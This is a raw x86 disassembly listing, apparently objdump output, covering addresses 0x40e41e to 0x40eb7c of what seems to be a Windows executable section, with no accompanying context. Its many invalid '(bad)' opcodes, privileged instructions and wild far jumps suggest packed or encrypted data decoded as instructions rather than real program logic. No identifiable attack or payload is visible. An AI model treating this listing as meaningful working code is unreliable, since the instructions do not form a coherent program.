  40e41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e41f:	pusha  
  40e420:	inc    edi
  40e421:	lahf   
  40e422:	jle    0x40e400
  40e424:	add    eax,DWORD PTR [eax-0x6b]
  40e427:	in     eax,0x51
  40e429:	dec    esi
  40e42a:	fld    QWORD PTR [esi]
  40e42c:	dec    edx
  40e42d:	scas   eax,DWORD PTR es:[edi]
  40e42e:	xchg   edi,eax
  40e42f:	enter  0x6c64,0x7
  40e433:	xchg   esi,eax
  40e434:	add    DWORD PTR [edx+0x4139a8a],ebx
  40e43a:	mov    edi,0x40517687
  40e43f:	nop
  40e440:	jmp    0xa017:0xd18e9741
  40e447:	je     0x40e474
  40e449:	pop    ecx
  40e44a:	pop    edi
  40e44b:	jge    0x40e468
  40e44d:	rol    DWORD PTR [ecx+0x123ed343],cl
  40e453:	add    eax,DWORD PTR [ebx+0x7727a77e]
  40e459:	test   BYTE PTR [ebp+0xf7a9301],dh
  40e45f:	sub    eax,0xe539e10d
  40e464:	pushf  
  40e465:	jge    0x40e456
  40e467:	jb     0x40e460
  40e469:	pop    ecx
  40e46a:	es xor esi,esp
  40e46d:	xchg   ebx,eax
  40e46e:	push   ebx
  40e46f:	test   eax,0x3e1ff97c
  40e474:	loope  0x40e498
  40e476:	jp     0x40e474
  40e478:	mov    ecx,0x6ac1a3b5
  40e47d:	stos   DWORD PTR es:[edi],eax
  40e47e:	jl     0x40e48c
  40e480:	daa    
  40e481:	adc    bh,BYTE PTR [edx-0x69c2d84]
  40e487:	sbb    ebx,DWORD PTR [esi+ebp*1+0x3b]
  40e48b:	xor    al,BYTE PTR [ecx+0x7f7331ad]
  40e491:	push   esp
  40e492:	test   BYTE PTR [esi+0x765b66ca],bl
  40e498:	pop    edx
  40e499:	je     0x40e4d3
  40e49b:	sub    DWORD PTR [edi+0x4e],edi
  40e49e:	or     BYTE PTR [esi+0x5f229f83],0xbc
  40e4a5:	adc    eax,esp
  40e4a7:	sbb    ebp,DWORD PTR [edi]
  40e4a9:	pop    edx
  40e4aa:	shl    DWORD PTR [ebp+eax*1-0x1e],1
  40e4ae:	add    al,0xe9
  40e4b0:	jge    0x40e4cd
  40e4b2:	xchg   DWORD PTR [ebx],esi
  40e4b4:	ins    BYTE PTR es:[edi],dx
  40e4b5:	popf   
  40e4b6:	sub    edx,ebx
  40e4b8:	xchg   BYTE PTR [edx+0x34],cl
  40e4bb:	jle    0x40e485
  40e4bd:	push   edi
  40e4be:	or     al,ah
  40e4c0:	cdq    
  40e4c1:	lea    cx,[ebp-0x5faf0c21]
  40e4c8:	jne    0x40e513
  40e4ca:	and    al,0x4a
  40e4cc:	aaa    
  40e4cd:	push   esp
  40e4ce:	jno    0x40e46f
  40e4d0:	xlat   BYTE PTR fs:[ebx]
  40e4d2:	xor    al,0xa6
  40e4d4:	jmp    0x40e47f
  40e4d6:	jecxz  0x40e4fc
  40e4d8:	xchg   esp,ecx
  40e4da:	pop    esp
  40e4db:	cmp    ah,dh
  40e4dd:	add    esp,DWORD PTR [edx-0x53861762]
  40e4e3:	scas   eax,DWORD PTR es:[edi]
  40e4e4:	out    dx,al
  40e4e5:	pushf  
  40e4e6:	lds    eax,FWORD PTR [ebx]
  40e4e8:	jge    0x40e530
  40e4ea:	sbb    esp,DWORD PTR [eax+edx*1+0x24171da8]
  40e4f1:	mov    cs,WORD PTR [esi-0x2c6ce66c]
  40e4f7:	fldcw  WORD PTR [ecx-0x1f]
  40e4fa:	mov    eax,DWORD PTR [esi+ebp*8-0x3c]
  40e4fe:	leave  
  40e4ff:	inc    ebx
  40e500:	add    al,0xe7
  40e502:	cs jl  0x40e51c
  40e505:	jmp    0xab95:0x392cac84
  40e50c:	push   eax
  40e50d:	ins    DWORD PTR es:[edi],dx
  40e50e:	mov    al,ds:0xee492c33
  40e513:	sub    al,0xf6
  40e515:	xchg   ebx,eax
  40e516:	xchg   esi,eax
  40e517:	sbb    edx,edx
  40e519:	xchg   ecx,eax
  40e51a:	jmp    0x20c83fa4
  40e51f:	dec    ebx
  40e520:	mov    edi,0xcfc16a06
  40e525:	mov    ds:0xd1604f2a,al
  40e52a:	(bad)  
  40e52c:	aam    0xc4
  40e52e:	in     eax,0x99
  40e530:	jp     0x40e514
  40e532:	push   0x7c8dde23
  40e537:	in     al,0x88
  40e539:	adc    eax,0xd3605fb5
  40e53e:	bound  edx,QWORD PTR [edi-0xf]
  40e541:	jg     0x40e4c7
  40e543:	xchg   BYTE PTR [ebp+0x38f8c6b7],dl
  40e549:	imul   esp,DWORD PTR [eax],0xffffffe0
  40e54c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e54d:	(bad)  
  40e54e:	ror    BYTE PTR [ecx],cl
  40e550:	ss jge 0x40e5a5
  40e553:	xchg   esp,eax
  40e554:	test   eax,0x9f456c82
  40e559:	mov    ?,WORD PTR [edx]
  40e55b:	cmp    eax,0x50c8ff66
  40e560:	and    BYTE PTR [esi],cl
  40e562:	icebp  
  40e563:	mov    ecx,esi
  40e565:	sub    al,0xd6
  40e567:	cmp    al,0x7
  40e569:	icebp  
  40e56a:	mov    ecx,0xf82bd277
  40e56f:	and    ebp,0xffffff8b
  40e572:	and    al,0xf7
  40e574:	iret   
  40e575:	cs inc edi
  40e577:	sahf   
  40e578:	ja     0x40e5ba
  40e57a:	jmp    0x40e5d9
  40e57c:	cmp    BYTE PTR ds:0xdb2b8624,0x76
  40e583:	aas    
  40e584:	dec    edi
  40e585:	jne    0x40e5ca
  40e587:	adc    ebp,DWORD PTR [ecx+0x18]
  40e58a:	xchg   esp,eax
  40e58b:	mov    esi,0xc7b97555
  40e590:	imul   ebx,DWORD PTR [ecx+0x1058e65c],0xffffff8a
  40e597:	and    BYTE PTR [eax-0x1bbee4f1],al
  40e59d:	clc    
  40e59e:	sti    
  40e59f:	fsub   st(7),st
  40e5a1:	imul   esi,esp,0x2
  40e5a4:	xor    BYTE PTR cs:[eax-0x508023c2],cl
  40e5ab:	mov    edi,0xbdfcdb6a
  40e5b0:	scas   eax,DWORD PTR es:[edi]
  40e5b1:	test   DWORD PTR [ecx-0x61],edi
  40e5b4:	add    DWORD PTR [edi-0x28],ebx
  40e5b7:	pop    eax
  40e5b8:	adc    al,0x91
  40e5ba:	push   ds
  40e5bb:	sbb    al,0xd3
  40e5bd:	stos   BYTE PTR es:[edi],al
  40e5be:	mov    esi,DWORD PTR [edx+eax*1]
  40e5c1:	mov    cl,0x61
  40e5c3:	inc    ebx
  40e5c4:	(bad)  
  40e5c5:	sub    al,0xb4
  40e5c7:	adc    al,0x10
  40e5c9:	jb     0x40e589
  40e5cb:	push   ecx
  40e5cc:	xor    al,0x58
  40e5ce:	jo     0x40e5d9
  40e5d0:	adc    edi,DWORD PTR [edx]
  40e5d2:	outs   dx,BYTE PTR ds:[esi]
  40e5d3:	lods   eax,DWORD PTR ds:[esi]
  40e5d4:	xchg   ecx,eax
  40e5d5:	push   es
  40e5d6:	and    BYTE PTR [edx+0x41f3c6ac],cl
  40e5dc:	sti    
  40e5dd:	adc    al,0x1c
  40e5df:	je     0x40e5e8
  40e5e1:	test   DWORD PTR ds:0xd029cfe2,edx
  40e5e7:	in     al,dx
  40e5e8:	iret   
  40e5e9:	jmp    0x67449d95
  40e5ee:	daa    
  40e5ef:	mov    edx,ecx
  40e5f1:	(bad)  
  40e5f2:	sahf   
  40e5f3:	jo     0x40e63c
  40e5f5:	sub    eax,0xcbe997cb
  40e5fa:	adc    DWORD PTR [esi],0x28
  40e5fd:	push   ebp
  40e5fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5ff:	rcr    DWORD PTR [eax-0x7d],cl
  40e602:	cdq    
  40e603:	add    DWORD PTR [ebx-0x7d856a3c],esi
  40e609:	pop    edx
  40e60a:	or     esp,DWORD PTR [esi]
  40e60c:	or     eax,0x370fbb93
  40e611:	jl     0x40e5e5
  40e613:	and    bl,0xe3
  40e616:	xor    al,0x1a
  40e618:	nop
  40e619:	xchg   esp,eax
  40e61a:	stc    
  40e61b:	inc    edx
  40e61c:	out    dx,al
  40e61d:	jno    0x40e5ef
  40e61f:	in     eax,0xa9
  40e621:	fldcw  WORD PTR ds:0xc28e39c2
  40e627:	cmp    DWORD PTR [ecx],esp
  40e629:	mov    bl,0x3e
  40e62b:	outs   dx,DWORD PTR ds:[esi]
  40e62c:	or     eax,0x88265e47
  40e631:	sti    
  40e632:	adc    BYTE PTR ds:0x4f01e145,al
  40e638:	into   
  40e639:	fild   QWORD PTR [edi-0x662fc348]
  40e63f:	add    al,BYTE PTR [ecx]
  40e641:	jno    0x40e62d
  40e643:	(bad)  
  40e644:	jecxz  0x40e5dc
  40e646:	or     bl,dh
  40e648:	jmp    0x8f6:0xe4002ac
  40e64f:	(bad)  
  40e650:	mov    eax,ds:0x93639c2f
  40e655:	arpl   WORD PTR [edi+0xcba2882],di
  40e65b:	inc    esi
  40e65c:	cmp    DWORD PTR [esi],ebx
  40e65e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e65f:	cmp    edx,DWORD PTR [ebx+0x7e]
  40e662:	repz loope 0x40e6bf
  40e665:	cmp    dh,dh
  40e667:	jmp    0x40e6ce
  40e669:	dec    esi
  40e66a:	lock nop
  40e66c:	inc    edi
  40e66d:	sub    al,0xcf
  40e66f:	jmp    0xe0ec407c
  40e674:	add    edx,DWORD PTR [eax+ebp*1+0x480a823e]
  40e67b:	xchg   ebx,eax
  40e67c:	push   cs
  40e67d:	or     esi,edx
  40e67f:	inc    DWORD PTR [ecx+0x68]
  40e682:	push   edx
  40e683:	inc    ecx
  40e684:	and    al,BYTE PTR [esi-0x33279d5e]
  40e68a:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40e68c:	loop   0x40e6e3
  40e68e:	dec    ebp
  40e68f:	mov    es,edi
  40e691:	scas   al,BYTE PTR es:[edi]
  40e692:	xchg   BYTE PTR [ebx],cl
  40e694:	mov    dh,0x5e
  40e696:	sbb    edi,DWORD PTR [edi]
  40e698:	sbb    eax,0x9b110b1b
  40e69d:	arpl   bp,cx
  40e69f:	sub    dl,BYTE PTR [ebx]
  40e6a1:	ins    BYTE PTR es:[edi],dx
  40e6a2:	shl    DWORD PTR [ebx],cl
  40e6a4:	js     0x40e6ba
  40e6a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6a7:	xchg   BYTE PTR [ecx+0x1a49dc10],bl
  40e6ad:	in     al,0x6b
  40e6af:	mov    eax,0xbadc88d
  40e6b4:	mov    WORD PTR [edx+eiz*2-0x77],?
  40e6b8:	inc    ebp
  40e6b9:	ds (bad) 
  40e6bb:	push   esi
  40e6bc:	jae    0x40e709
  40e6be:	adc    ch,ch
  40e6c0:	cmp    ebp,edx
  40e6c2:	dec    ecx
  40e6c3:	std    
  40e6c4:	and    eax,DWORD PTR [ecx-0x7]
  40e6c7:	xor    al,0x14
  40e6c9:	ret    0xd45f
  40e6cc:	cdq    
  40e6cd:	and    al,0x43
  40e6cf:	neg    DWORD PTR [esi-0x33]
  40e6d2:	loope  0x40e6e2
  40e6d4:	call   0xa461b560
  40e6d9:	pop    es
  40e6da:	mov    al,gs:0x3bc78fc0
  40e6e0:	jb     0x40e750
  40e6e2:	add    eax,DWORD PTR [edx+eax*1]
  40e6e5:	mov    ecx,0xbca813f8
  40e6ea:	and    al,0xa0
  40e6ec:	loop   0x40e686
  40e6ee:	ret    
  40e6ef:	arpl   WORD PTR [ecx],si
  40e6f1:	cli    
  40e6f2:	cwde   
  40e6f3:	pop    ebx
  40e6f4:	jp     0x40e744
  40e6f6:	add    DWORD PTR [ebx+0xa620de],edx
  40e6fc:	or     al,0x16
  40e6fe:	(bad)  
  40e6ff:	mov    bh,al
  40e701:	imul   esp,DWORD PTR [ebx-0x2b6d29de],0xdfd6f21d
  40e70b:	mov    ds:0x5fb0b71a,eax
  40e710:	and    ebx,DWORD PTR [edx+0x388e67da]
  40e716:	cwde   
  40e717:	jns    0x40e764
  40e719:	mov    edi,0xb28e5ebf
  40e71e:	call   0xad86b4bf
  40e723:	lds    edi,FWORD PTR [edx+0x44]
  40e726:	add    DWORD PTR [ebp+0x15],edi
  40e729:	mov    BYTE PTR [ebp+0xe],dh
  40e72c:	mov    bh,0x48
  40e72e:	or     eax,DWORD PTR [ecx+0x3a4c6af4]
  40e734:	ret    
  40e735:	mov    cl,0x9c
  40e737:	fs inc esi
  40e739:	jle    0x40e780
  40e73b:	dec    edx
  40e73c:	repz fdiv QWORD PTR [edi-0x5]
  40e740:	loop   0x40e71e
  40e742:	clc    
  40e743:	jo     0x40e716
  40e745:	sahf   
  40e746:	cli    
  40e747:	int    0x25
  40e749:	mov    bh,0x7a
  40e74b:	arpl   WORD PTR [edi-0x4c945fe],di
  40e751:	into   
  40e752:	dec    ebx
  40e753:	(bad)
  40e757:	fistp  WORD PTR [edx]
  40e759:	adc    esp,esi
  40e75b:	dec    edx
  40e75c:	pop    edi
  40e75d:	jp     0x40e7dc
  40e75f:	jg     0x40e77f
  40e761:	out    dx,eax
  40e762:	push   0xa5823aeb
  40e767:	xor    al,BYTE PTR [ebp-0x41]
  40e76a:	sbb    al,0x22
  40e76c:	mov    ?,WORD PTR [esi+eiz*8]
  40e76f:	mov    esi,0xeea53ad6
  40e774:	mov    ecx,0xa7f8b1a7
  40e779:	cs mov bh,bl
  40e77c:	js     0x40e7a8
  40e77e:	nop
  40e77f:	jecxz  0x40e705
  40e781:	xchg   ebp,eax
  40e782:	ret    0x501e
  40e785:	test   eax,0x28079fcf
  40e78a:	les    edx,FWORD PTR [eax+0x47ba6b86]
  40e790:	iret   
  40e791:	cdq    
  40e792:	test   BYTE PTR [edx+0x34],0xab
  40e796:	fcmovne st,st(1)
  40e798:	mov    eax,ds:0xfc4cc942
  40e79d:	rol    DWORD PTR [edx+ecx*1-0x52],1
  40e7a1:	stos   BYTE PTR es:[edi],al
  40e7a2:	ret    
  40e7a3:	mov    ah,0x8b
  40e7a5:	jg     0x40e7dd
  40e7a7:	cmp    bl,al
  40e7a9:	outs   dx,DWORD PTR ds:[esi]
  40e7aa:	out    0xfb,al
  40e7ac:	and    edx,DWORD PTR [edx+0xb]
  40e7af:	out    0x74,eax
  40e7b1:	push   cs
  40e7b2:	(bad)  
  40e7b3:	addr16 xor ax,0xfbb6
  40e7b8:	fst    st(0)
  40e7ba:	mov    ecx,0x630b58d1
  40e7bf:	neg    ebx
  40e7c1:	jmp    FWORD PTR [esi-0x21]
  40e7c4:	in     al,0x94
  40e7c6:	and    al,0xb8
  40e7c8:	neg    DWORD PTR [ecx]
  40e7ca:	je     0x40e794
  40e7cc:	aaa    
  40e7cd:	mov    BYTE PTR es:[ecx-0x4e5334e0],ch
  40e7d4:	retf   0x5c60
  40e7d7:	sbb    ah,bl
  40e7d9:	jb     0x40e80c
  40e7db:	mul    BYTE PTR [edx-0x17]
  40e7de:	pop    ebp
  40e7df:	mov    ebp,gs
  40e7e1:	sbb    DWORD PTR [edx+0x6a944ad4],ebp
  40e7e7:	xchg   ebp,eax
  40e7e8:	call   0x4408:0xd2fce995
  40e7ef:	outs   dx,BYTE PTR ds:[esi]
  40e7f0:	mov    DWORD PTR [edx-0x2494ea7d],edx
  40e7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f7:	xchg   edi,eax
  40e7f8:	cs hlt 
  40e7fa:	outs   dx,DWORD PTR ds:[esi]
  40e7fb:	pop    esi
  40e7fc:	pop    DWORD PTR [ebx+0x252c2cda]
  40e802:	popf   
  40e803:	push   DWORD PTR [eax+0x4b363b7a]
  40e809:	or     bl,BYTE PTR [eax]
  40e80b:	rcl    BYTE PTR [edx+0x7d],1
  40e80e:	push   ss
  40e80f:	lahf   
  40e810:	das    
  40e811:	jno    0x40e7ca
  40e813:	mov    ch,0x3d
  40e815:	in     al,0x9a
  40e817:	das    
  40e818:	cdq    
  40e819:	xor    al,0x41
  40e81b:	popa   
  40e81c:	xor    eax,0xeb89d5d5
  40e821:	xchg   DWORD PTR [ebx],ebp
  40e823:	mov    ebp,0xc949b284
  40e828:	push   ds
  40e829:	xchg   ecx,eax
  40e82a:	fisub  WORD PTR [eax+edi*1]
  40e82d:	sahf   
  40e82e:	cmp    eax,0x9ec3dd2
  40e833:	clc    
  40e834:	jae    0x40e7fc
  40e836:	pop    esi
  40e837:	aam    0x38
  40e839:	je     0x40e7ca
  40e83b:	or     BYTE PTR [ecx],al
  40e83d:	mov    cl,BYTE PTR [ecx+ebx*8]
  40e840:	sub    al,0xe1
  40e842:	mov    ds:0x8317f3bd,eax
  40e847:	inc    esi
  40e848:	icebp  
  40e849:	out    dx,eax
  40e84a:	xor    DWORD PTR [edx+0x4fdfd36f],ecx
  40e850:	cld    
  40e851:	popa   
  40e852:	fiadd  WORD PTR [edi]
  40e854:	inc    esi
  40e855:	inc    ebx
  40e856:	mov    ds:0x9d3fb642,eax
  40e85b:	xchg   ebp,eax
  40e85c:	(bad)  
  40e85d:	rol    BYTE PTR [eax+0x6f],cl
  40e860:	mov    eax,0x8603d23a
  40e865:	inc    eax
  40e866:	inc    ecx
  40e867:	ja     0x40e7f2
  40e869:	or     ah,BYTE PTR [edi-0x73fbf84a]
  40e86f:	sbb    DWORD PTR [ebx],ebx
  40e871:	sbb    DWORD PTR [edi-0x85aec5a],0x6
  40e878:	fadd   DWORD PTR [edx-0x37b3f140]
  40e87e:	mov    ds:0xc697992b,al
  40e883:	add    DWORD PTR [edi],eax
  40e885:	mov    ecx,?
  40e887:	aaa    
  40e888:	clc    
  40e889:	repz pop ecx
  40e88b:	lea    esp,[ebx]
  40e88d:	ret    
  40e88e:	mov    edi,0x91e86d7b
  40e893:	int    0x29
  40e895:	push   ebp
  40e896:	mov    eax,ds:0xc077839e
  40e89b:	sub    DWORD PTR [esi+0x6b],eax
  40e89e:	nop
  40e89f:	fs (bad) 
  40e8a1:	ja     0x40e88e
  40e8a3:	pop    ebp
  40e8a4:	mov    gs,WORD PTR ds:0x15bb5213
  40e8aa:	aas    
  40e8ab:	cs add eax,0xbd7780da
  40e8b1:	dec    ecx
  40e8b2:	arpl   WORD PTR [edx-0x37],bx
  40e8b5:	xchg   esi,eax
  40e8b6:	push   eax
  40e8b7:	jne    0x40e853
  40e8b9:	retf   
  40e8ba:	adc    BYTE PTR ds:0xca4920b8,0xa4
  40e8c1:	cmp    al,0x53
  40e8c3:	push   ebp
  40e8c4:	clc    
  40e8c5:	fcmovne st,st(0)
  40e8c7:	push   esi
  40e8c8:	inc    esp
  40e8c9:	cs adc edi,edi
  40e8cc:	jae    0x40e8a4
  40e8ce:	pusha  
  40e8cf:	and    eax,0x451f53db
  40e8d5:	mov    BYTE PTR [esi-0x28ed9dd],bh
  40e8db:	outs   dx,DWORD PTR ds:[esi]
  40e8dc:	ja     0x40e8e1
  40e8de:	and    BYTE PTR [ebx+0x6c5026bd],ch
  40e8e4:	mov    bl,0xac
  40e8e6:	inc    edi
  40e8e7:	std    
  40e8e8:	dec    eax
  40e8e9:	pop    es
  40e8ea:	stos   BYTE PTR es:[edi],al
  40e8eb:	ret    0x1715
  40e8ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8ef:	cwde   
  40e8f0:	clc    
  40e8f1:	leave  
  40e8f2:	mov    bh,cl
  40e8f4:	call   0x3d11:0xb6df75dd
  40e8fb:	jle    0x40e973
  40e8fd:	iret   
  40e8fe:	out    dx,eax
  40e8ff:	and    cl,bh
  40e901:	xchg   esp,eax
  40e902:	add    al,0xd3
  40e904:	icebp  
  40e905:	jbe    0x40e95d
  40e907:	arpl   sp,si
  40e909:	dec    edx
  40e90a:	pop    esp
  40e90b:	mov    dh,0x76
  40e90d:	mov    esi,0x650c325e
  40e912:	out    dx,eax
  40e913:	jmp    0x40e8d3
  40e915:	imul   eax,DWORD PTR [ecx],0xe7a483f3
  40e91b:	popf   
  40e91c:	jl     0x40e958
  40e91e:	pop    esp
  40e91f:	mov    esp,0x47d7ff18
  40e924:	xor    ebp,DWORD PTR [esi-0x39]
  40e927:	aam    0x7e
  40e929:	mov    ecx,0x79f4d5ac
  40e92e:	(bad)  
  40e92f:	fucomp st(4)
  40e931:	in     eax,dx
  40e932:	inc    esi
  40e933:	clc    
  40e934:	sbb    eax,0x5cf3787e
  40e939:	mov    ch,0x6d
  40e93b:	ret    
  40e93c:	jns    0x40e9a0
  40e93e:	ret    
  40e93f:	je     0x40e943
  40e941:	(bad)  
  40e943:	jp     0x40e970
  40e945:	call   0x33a9:0xedc4e095
  40e94c:	jmp    0x40e9b3
  40e94e:	pop    edx
  40e94f:	cwde   
  40e950:	dec    ecx
  40e951:	outs   dx,BYTE PTR ds:[esi]
  40e952:	jecxz  0x40e8da
  40e954:	cwde   
  40e955:	mov    eax,0xeb83de8f
  40e95a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e95b:	mov    al,0x95
  40e95d:	retf   
  40e95e:	mov    BYTE PTR [edi+0x6b],dl
  40e961:	sub    edx,DWORD PTR [ebx+0x64d909a4]
  40e967:	and    ecx,esi
  40e969:	int3   
  40e96a:	out    0xc4,eax
  40e96c:	lods   eax,DWORD PTR ds:[esi]
  40e96d:	inc    DWORD PTR ds:[esi+eax*1]
  40e971:	pushw  ss
  40e973:	or     DWORD PTR [edx-0x6],esi
  40e976:	xor    eax,0x1550f685
  40e97b:	add    eax,0x7d6d20cd
  40e980:	repz sbb DWORD PTR [esp+edi*1-0x194ea262],eax
  40e988:	sbb    DWORD PTR [edx+eiz*4-0x10cd18ca],eax
  40e98f:	stos   BYTE PTR es:[edi],al
  40e990:	inc    esp
  40e991:	(bad)  
  40e992:	shr    BYTE PTR [ecx-0x54],1
  40e995:	xchg   edi,eax
  40e996:	xor    BYTE PTR [ecx+0x79ea2c5a],0xe
  40e99d:	mov    edx,0x45d40a8e
  40e9a2:	sub    eax,0x9c980a17
  40e9a7:	or     dl,BYTE PTR [ecx+eax*2-0x75]
  40e9ab:	pop    edx
  40e9ac:	std    
  40e9ad:	aas    
  40e9ae:	jecxz  0x40e971
  40e9b0:	repz lea esp,[ecx+0x75b17636]
  40e9b7:	inc    DWORD PTR [edi-0x30e93dda]
  40e9bd:	jmp    0x40ea34
  40e9bf:	scas   al,BYTE PTR es:[edi]
  40e9c0:	mov    al,ds:0x5d26e679
  40e9c5:	push   es
  40e9c6:	test   DWORD PTR [edi],ebp
  40e9c8:	int    0xf3
  40e9ca:	cmp    al,0x4d
  40e9cc:	sbb    DWORD PTR [ecx-0x3743d9d8],0x52
  40e9d3:	out    dx,eax
  40e9d4:	pop    eax
  40e9d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9d6:	adc    ecx,ebx
  40e9d8:	jae    0x40ea45
  40e9da:	dec    ecx
  40e9db:	fimul  WORD PTR [edi+ecx*8-0xdc8048e]
  40e9e2:	push   0x3b
  40e9e4:	mov    dh,0x41
  40e9e6:	xchg   ebp,eax
  40e9e7:	imul   ebp,DWORD PTR [edi-0x1eda7042],0xffffffd7
  40e9ee:	jo     0x40e9e1
  40e9f0:	test   al,0xe7
  40e9f2:	rcl    BYTE PTR [esi-0x5ee02616],0xb7
  40e9f9:	repnz xor BYTE PTR [eax+0xdbddf09],ch
  40ea00:	aad    0x73
  40ea02:	fdivr  st(7),st
  40ea04:	jmp    DWORD PTR [edx-0x59]
  40ea07:	fild   QWORD PTR [ecx+0x25]
  40ea0a:	lds    esp,FWORD PTR [edi-0x4786d1b6]
  40ea10:	lds    esp,FWORD PTR [esi+0x72]
  40ea13:	scas   al,BYTE PTR es:[edi]
  40ea14:	mov    dh,BYTE PTR [edx-0x341d4c91]
  40ea1a:	inc    eax
  40ea1b:	push   cs
  40ea1c:	arpl   WORD PTR [edx+ebx*4-0x7908ba85],sp
  40ea23:	xchg   esp,eax
  40ea24:	test   esi,ecx
  40ea26:	mov    al,ds:0x888b8943
  40ea2b:	repz jp 0x40e9ed
  40ea2e:	and    eax,edx
  40ea30:	inc    dh
  40ea32:	xchg   edi,eax
  40ea33:	sbb    eax,0xd1f205c2
  40ea38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea39:	lods   eax,DWORD PTR ds:[esi]
  40ea3a:	jae    0x40e9f7
  40ea3c:	and    BYTE PTR [ebx-0xa4c9b63],dh
  40ea42:	rcl    ah,1
  40ea44:	scas   eax,DWORD PTR es:[edi]
  40ea45:	out    dx,eax
  40ea46:	es int 0xe7
  40ea49:	hlt    
  40ea4a:	mov    ah,0x91
  40ea4c:	mov    al,0xf2
  40ea4e:	jle    0x40eab2
  40ea50:	pop    esi
  40ea51:	xchg   edx,eax
  40ea52:	aaa    
  40ea53:	push   0x523bda90
  40ea58:	pop    ebp
  40ea59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea5a:	or     DWORD PTR [ebx-0x33d9caae],eax
  40ea60:	test   eax,0x218631b1
  40ea65:	mov    al,ds:0xd6c8174b
  40ea6a:	adc    al,BYTE PTR [ebp-0x66]
  40ea6d:	push   ebx
  40ea6e:	cmp    esp,DWORD PTR [ebx]
  40ea70:	add    BYTE PTR [edi],0xd8
  40ea73:	adc    eax,0xa1383157
  40ea78:	in     al,0x17
  40ea7a:	sbb    edi,DWORD PTR [edi+0x68]
  40ea7d:	data16 outs dx,BYTE PTR ds:[esi]
  40ea7f:	jne    0x40eaba
  40ea81:	gs or  al,0x3b
  40ea84:	jnp    0x40ea07
  40ea86:	aas    
  40ea87:	in     al,0x30
  40ea89:	shl    edi,1
  40ea8b:	stc    
  40ea8c:	mov    BYTE PTR [ebp+0x5b],dh
  40ea8f:	sub    eax,0x34d8d1f0
  40ea94:	arpl   WORD PTR [edi+0x2f],ax
  40ea97:	lahf   
  40ea98:	add    bh,BYTE PTR [eax+0x16bb444a]
  40ea9e:	jbe    0x40eb0b
  40eaa0:	mov    BYTE PTR [ecx-0x65],al
  40eaa3:	out    0x48,eax
  40eaa5:	xchg   esp,eax
  40eaa6:	inc    eax
  40eaa7:	push   eax
  40eaa8:	fcomp  DWORD PTR [ecx-0x10c79a78]
  40eaae:	pop    edi
  40eaaf:	xlat   BYTE PTR ds:[ebx]
  40eab0:	pushf  
  40eab1:	pop    esp
  40eab2:	push   eax
  40eab3:	aam    0xfb
  40eab5:	sub    al,0xcb
  40eab7:	lea    ecx,[ebp*2+0xac94d20]
  40eabe:	lock jmp 0x40ea89
  40eac1:	push   ebp
  40eac2:	jmp    0x40eb1a
  40eac4:	std    
  40eac5:	cmp    al,0xc5
  40eac7:	jmp    0x40eb18
  40eac9:	and    edx,ebp
  40eacb:	adc    al,0x18
  40eacd:	mov    bh,0xcc
  40eacf:	fidivr WORD PTR [ecx+0x42]
  40ead2:	test   DWORD PTR [edi+0x41],ebp
  40ead5:	cwde   
  40ead6:	test   DWORD PTR [esi+0x60a059ee],ebx
  40eadc:	xor    al,ah
  40eade:	retf   
  40eadf:	ret    
  40eae0:	nop
  40eae1:	call   0x865a7a52
  40eae6:	ficom  WORD PTR [edx]
  40eae8:	cmp    BYTE PTR [edx+edi*4+0x1b83e75],al
  40eaef:	jmp    0x934442d6
  40eaf4:	fwait
  40eaf5:	push   esi
  40eaf6:	das    
  40eaf7:	std    
  40eaf8:	cmp    dl,BYTE PTR [ebp-0x30]
  40eafb:	cmp    al,0x2a
  40eafd:	add    DWORD PTR [edi-0x56],0xffffff92
  40eb01:	ret    
  40eb02:	jb     0x40eaa2
  40eb04:	mov    ds:0x245a9332,eax
  40eb09:	jo     0x40eb6b
  40eb0b:	jp     0x40eaf8
  40eb0d:	pop    es
  40eb0e:	mov    al,0xbf
  40eb10:	mov    dh,0xfa
  40eb12:	sbb    ebx,DWORD PTR [edi-0x3]
  40eb15:	pop    ss
  40eb16:	ds dec ebx
  40eb18:	clc    
  40eb19:	bound  edi,QWORD PTR [esi]
  40eb1b:	int    0xac
  40eb1d:	pop    ss
  40eb1e:	jecxz  0x40eb36
  40eb20:	js     0x40eae0
  40eb22:	cmp    al,BYTE PTR [edx-0x4]
  40eb25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb26:	mov    edx,0x7b341f9a
  40eb2b:	aas    
  40eb2c:	mov    WORD PTR [eax],fs
  40eb2e:	std    
  40eb2f:	retf   
  40eb30:	mov    dh,0x80
  40eb32:	xor    edi,DWORD PTR [edx+0x73]
  40eb35:	push   cs
  40eb36:	jl     0x40eb82
  40eb38:	jns    0x40ebaa
  40eb3a:	adc    eax,0x4f11554a
  40eb3f:	jmp    0x3e07:0x2093992a
  40eb46:	ret    
  40eb47:	(bad)  
  40eb48:	leave  
  40eb49:	sub    esi,ebp
  40eb4b:	jbe    0x40eadd
  40eb4d:	push   esi
  40eb4e:	inc    ebp
  40eb4f:	mov    dl,0x48
  40eb51:	push   esp
  40eb52:	hlt    
  40eb53:	mov    ah,0x42
  40eb55:	aaa    
  40eb56:	cmp    dl,BYTE PTR [ecx-0x37]
  40eb59:	add    DWORD PTR [esi-0xe],esp
  40eb5c:	les    ecx,FWORD PTR [eax-0x3bc9c58b]
  40eb62:	pop    DWORD PTR [ebx]
  40eb64:	icebp  
  40eb65:	addr16 pop esp
  40eb67:	(bad)  
  40eb68:	std    
  40eb69:	scas   al,BYTE PTR es:[edi]
  40eb6a:	sub    BYTE PTR [edx-0x18],ch
  40eb6d:	clc    
  40eb6e:	je     0x40eb2a
  40eb70:	jae    0x40eb47
  40eb72:	cmp    esi,DWORD PTR [ebx+0x3f5728b]
  40eb78:	xchg   esp,eax
  40eb79:	mov    bl,0xb1
  40eb7b:	push   ds
  40eb7c:	lock call 0x28506eef
